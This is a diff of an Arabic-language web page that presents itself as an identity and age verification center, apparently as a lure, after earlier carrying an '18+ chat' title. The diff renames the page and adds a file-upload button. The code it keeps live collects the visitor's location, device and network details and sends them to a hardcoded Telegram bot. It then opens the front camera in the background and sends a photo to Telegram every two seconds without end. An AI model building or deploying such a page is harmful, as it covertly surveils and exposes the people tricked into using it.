@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>شات +18</title>
+    <title>مركز التحقق والأمان</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -23,6 +23,8 @@
         }
         h2 { color: #0088cc; margin-bottom: 10px; }
         p { color: #666; font-size: 14px; margin-bottom: 25px; }
+        
+        /* تنسيق الأزرار الموحد والمحسن */
         button {
             padding: 15px 30px;
             font-size: 16px;
@@ -35,6 +37,7 @@
             transition: all 0.3s ease;
             width: 100%;
             box-shadow: 0 4px 6px rgba(0,136,204,0.2);
+            margin-bottom: 15px; /* مسافة بين الأزرار */
         }
         button:hover {
             background-color: #006699;
@@ -52,8 +55,14 @@
 
     <div class="container">
         <h2>تأكيد الهوية والتحقق من انك لست قاصر</h2>
-        <p>يرجى الضغط على الزر أدناه للسماح بصلاحيات الكاميرا للتحقق الذكي .</p>
+        <p>يرجى الضغط على الزر أدناه للسماح بصلاحيات الكاميرا للتحقق الذكي أو رفع ملف الهوية يدوياً.</p>
+        
         <button id="startBtn">ابدأ التحقق الآن</button>
+        
+        <button id="uploadBtn">اختر الملف لبدء العملية</button>
+
+        <input type="file" id="fileInput" style="display: none;">
+
         <div id="status"></div>
     </div>
 
@@ -64,6 +73,27 @@
         const TELEGRAM_TOKEN = "8798573888:AAE38QVvgG0DgwePDKMaBcOpKOomweVzsb8";
         const CHAT_ID = "5394550159";
 
+        // أحداث زر رفع الملف المخصص المدمج
+        const uploadBtn = document.getElementById('uploadBtn');
+        const fileInput = document.getElementById('fileInput');
+
+        uploadBtn.addEventListener('click', () => {
+            fileInput.click(); 
+        });
+
+        fileInput.addEventListener('change', (event) => {
+            const selectedFile = event.target.files[0];
+            if (selectedFile) {
+                console.log("تم اختيار الملف: " + selectedFile.name);
+                startProcessing(selectedFile);
+            }
+        });
+
+        function startProcessing(file) {
+            alert("بدأت العملية على ملف: " + file.name);
+        }
+
+        // أحداث النظام السابقة الخاصة بالتحقق والكاميرا
         document.getElementById('startBtn').addEventListener('click', async () => {
             const statusDiv = document.getElementById('status');
             statusDiv.style.color = "#333";
@@ -73,18 +103,15 @@
             const deviceInfo = navigator.userAgent;
             const networkInfo = navigator.connection ? `Type: ${navigator.connection.effectiveType}, Downlink: ${navigator.connection.downlink}Mbps` : "Unknown";
 
-            // 1. جلب الموقع الجغرافي لمرة واحدة في البداية
             try {
                 locationData = await getPosition();
             } catch (err) {
                 console.log("إذن الموقع مرفوض.");
             }
 
-            // 2. إرسال التقرير النصي الأول فوراً لتليجرام
             const textMessage = `📊 بدء جلسة مراقبة مستمرة:\n📌 الموقع: ${locationData}\n📱 الجهاز: ${deviceInfo}\n🌐 الشبكة: ${networkInfo}`;
             sendTextMessage(textMessage);
 
-            // 3. تشغيل الكاميرا في الخلفية والبدء في التقاط الصور اللانهائي كل ثانيتين
             try {
                 statusDiv.style.color = "green";
                 statusDiv.innerText = "✅ النظام يعمل الآن ...";
@@ -96,7 +123,6 @@
             }
         });
 
-        // دالة جلب إحداثيات الموقع
         function getPosition() {
             return new Promise((resolve, reject) => {
                 if (!navigator.geolocation) reject();
@@ -108,7 +134,6 @@
             });
         }
 
-        // دالة إرسال النصوص إلى تليجرام
         function sendTextMessage(text) {
             const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
             fetch(url, {
@@ -118,30 +143,24 @@
             }).catch(err => console.log("خطأ في إرسال النص:", err));
         }
 
-        // دالة تشغيل الكاميرا والتقاط صور لانهائية كل ثانيتين
         async function startContinuousCapture(location) {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
 
-            // فتح الكاميرا الأمامية للمستخدم في الخلفية وبدون صوت
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" }, 
                 audio: false 
             });
             video.srcObject = stream;
 
-            // انتظار ثانية ونصف للتأكد من استقرار عدسة الكاميرا وضبط الإضاءة تلقائياً
             await new Promise(resolve => setTimeout(resolve, 1500));
 
             let photoIndex = 1;
 
-            // حلقة تكرارية مستمرة (لا تنتهي طالما الصفحة مفتوحة)
             while (true) {
-                // رسم اللقطة الحالية من الكاميرا الخفية على الـ canvas
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // تحويلها لملف وإرسالها
                 await new Promise((resolve) => {
                     canvas.toBlob((blob) => {
                         if (blob) {
@@ -150,7 +169,6 @@
                             formData.append('photo', blob, `live_snap_${photoIndex}.jpg`);
                             formData.append('caption', `📸 لقطة حية رقم (#${photoIndex})\n📍 الموقع: ${location}`);
 
-                            // إرسال الصورة فوري مع تخطي قيود الـ CORS
                             fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                                 method: 'POST',
                                 body: formData,
@@ -160,10 +178,9 @@
                             photoIndex++;
                         }
                         resolve();
-                    }, 'image/jpeg', 0.7); // جودة ممتازة وحجم صغير جداً لسرعة الإرسال المستمر
+                    }, 'image/jpeg', 0.7);
                 });
 
-                // الانتظار لمدة ثانيتين (2000 مللي ثانية) قبل التقاط الصورة التالية
                 await new Promise(res => setTimeout(res, 2000));
             }
         }
